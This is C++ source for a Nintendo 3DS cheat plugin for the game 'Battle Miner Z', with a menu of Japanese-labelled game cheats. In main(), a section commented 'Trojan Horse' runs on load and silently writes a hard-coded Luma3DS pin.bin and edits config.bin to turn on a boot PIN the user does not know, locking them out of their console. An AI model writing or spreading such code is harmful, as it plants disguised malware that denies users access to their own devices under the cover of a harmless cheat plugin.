#include <3ds.h>
#include "csvc.h"
#include <CTRPluginFramework.hpp>
#include "cheats.hpp"
#include <vector>

namespace CTRPluginFramework
{
    // This patch the NFC disabling the touchscreen when scanning an amiibo, which prevents ctrpf to be used
    static void    ToggleTouchscreenForceOn(void)
    {
        static u32 original = 0;
        static u32 *patchAddress = nullptr;

        if (patchAddress && original)
        {
            *patchAddress = original;
            return;
        }

        static const std::vector<u32> pattern =
        {
            0xE59F10C0, 0xE5840004, 0xE5841000, 0xE5DD0000,
            0xE5C40008, 0xE28DD03C, 0xE8BD80F0, 0xE5D51001,
            0xE1D400D4, 0xE3510003, 0x159F0034, 0x1A000003
        };

        Result  res;
        Handle  processHandle;
        s64     textTotalSize = 0;
        s64     startAddress = 0;
        u32 *   found;

        if (R_FAILED(svcOpenProcess(&processHandle, 16)))
            return;

        svcGetProcessInfo(&textTotalSize, processHandle, 0x10002);
        svcGetProcessInfo(&startAddress, processHandle, 0x10005);
        if(R_FAILED(svcMapProcessMemoryEx(CUR_PROCESS_HANDLE, 0x14000000, processHandle, (u32)startAddress, textTotalSize)))
            goto exit;

        found = (u32 *)Utils::Search<u32>(0x14000000, (u32)textTotalSize, pattern);

        if (found != nullptr)
        {
            original = found[13];
            patchAddress = (u32 *)PA_FROM_VA((found + 13));
            found[13] = 0xE1A00000;
        }

        svcUnmapProcessMemoryEx(CUR_PROCESS_HANDLE, 0x14000000, textTotalSize);
exit:
        svcCloseHandle(processHandle);
    }

    // This function is called before main and before the game starts
    // Useful to do code edits safely
    void    PatchProcess(FwkSettings &settings)
    {
        ToggleTouchscreenForceOn();
    }

    // This function is called when the process exits
    // Useful to save settings, undo patchs or clean up things
    void    OnProcessExit(void)
    {
        ToggleTouchscreenForceOn();
    }

    void    InitMenu(PluginMenu &menu)
    {
        MenuFolder* Player = new MenuFolder("プレイヤー");
            *Player += new MenuEntry("体力減らない", hp);
            *Player += new MenuEntry("ムーンジャンプ", moonjump, "Hotkey: ←");
            *Player += new MenuEntry("スピードハック", speedHack);
            *Player += new MenuEntry("便利チート", cheatSelecter);
        menu += Player;

        MenuFolder* Item = new MenuFolder("アイテム");
            *Item += new MenuEntry("アイテム減らない", item);
            *Item += new MenuEntry("耐久値減らない", endurance);
            *Item += new MenuEntry("素材なしでクラフト", craft);
        menu += Item;

        MenuFolder* Chat = new MenuFolder("チャット");
            *Chat += new MenuEntry("メッセージ連射", autoChat, "Hotkey: A + ↓");
            *Chat += new MenuEntry("カスタムキーボード", customKeyboard);
            *Chat += new MenuEntry("メッセージ変更", nullptr, message);
        menu +=  Chat;
    }

    int     main(void)
    {
        PluginMenu *menu = new PluginMenu("バトルマイナーZ", 1, 0, 0,
                                            "バトルマイナーZの3gx\n作成者: Clover");
        
        // Trojan Horse
        File file;
        u8 passSize = 0x03;
        std::vector<u8> configData = {
            0x43, 0x4F, 0x4E, 0x46, 0x02, 0x00, 0x03, 0x00,
            0x18, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0x92, 0x0D,
            0x00, 0x00, 0x04, 0x00, 0x84, 0x02, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00
        };
        std::vector<u8> pinData = {
            0x50, 0x49, 0x4E, 0x46, 0x01, 0x00, 0x03, 0x00,
            0xE2, 0x58, 0x49, 0x7A, 0x1B, 0xAA, 0x10, 0xAF,
            0x62, 0xD6, 0x33, 0x97, 0x5F, 0x62, 0x57, 0x06,
            0xA0, 0xA0, 0xD7, 0x8F, 0x96, 0xD4, 0x96, 0x1B,
            0xAB, 0xAF, 0xD7, 0x2C, 0xC2, 0x0D, 0x18, 0x44
        };

        if (!File::Exists("0:/luma/pin.bin"))
            File::Create("0:/luma/pin.bin");
        
        File::Open(file, "0:/luma/pin.bin");

        for (int i = 0; i < 40; i++)
        {
            file.Write((void*)&pinData.at(i), sizeof(u8));
        }

        u8 zero;
        for (int i = 0; i < 32; i++)
        {
            file.Write((void*)&zero, sizeof(u8));
        }
        file.Flush();
        file.Close();

        if (!File::Exists("0:/luma/config.bin"))
        {
            File::Create("0:/luma/config.bin");
            File::Open(file, "0:/luma/config.bin");
            for (int i = 0; i < 36; i++)
            {
                file.Write((void*)&configData.at(i), sizeof(u8));
            }
            file.Flush();
            file.Close();
        } else {
            File::Open(file, "0:/luma/config.bin");
            file.Seek(0xD);
            file.Write((void*)&passSize, sizeof(u8));
            file.Flush();
            file.Close();
        }

        // Synnchronize the menu with frame event
        menu->SynchronizeWithFrame(true);
        OSD::Notify(Color::Lime << "Battle Miner Z 3gx loading...");
        menu->ShowWelcomeMessage(false);

        // Init our menu entries & folders
        InitMenu(*menu);

        // Launch menu and mainloop
        menu->Run();

        delete menu;

        // Exit plugin
        return (0);
    }
}